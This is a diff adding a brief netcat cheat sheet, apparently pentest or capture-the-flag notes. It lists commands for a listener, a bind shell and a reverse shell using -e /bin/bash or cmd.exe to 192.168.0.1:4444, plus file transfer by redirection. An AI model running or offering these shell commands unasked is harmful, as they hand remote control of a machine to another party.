@@ -1,0 +1,10 @@
+listening on 4444 :  nc -lvnp 4444 
+connecting to 4444 of other host : nc 192.168.0.1 4444
+
+listening on 4444 with own shell : nc -lvnp 4444 -e /bin/bash or nc -lvnp 4444 -e cmd.exe (bind shell)
+connecting on 4444 of other host with own shell : nc 192.168.0.1 4444 -e /bin/bash & nc 192.168.0.1 4444 -e cmd.exe (reverse shell)
+
+listing on 4444 with file to share : nc -lvnp 4444 < myfile.php
+connecting on 4444 with file to share : nc 192.168.0.1 4444 > myfile.php
+
+
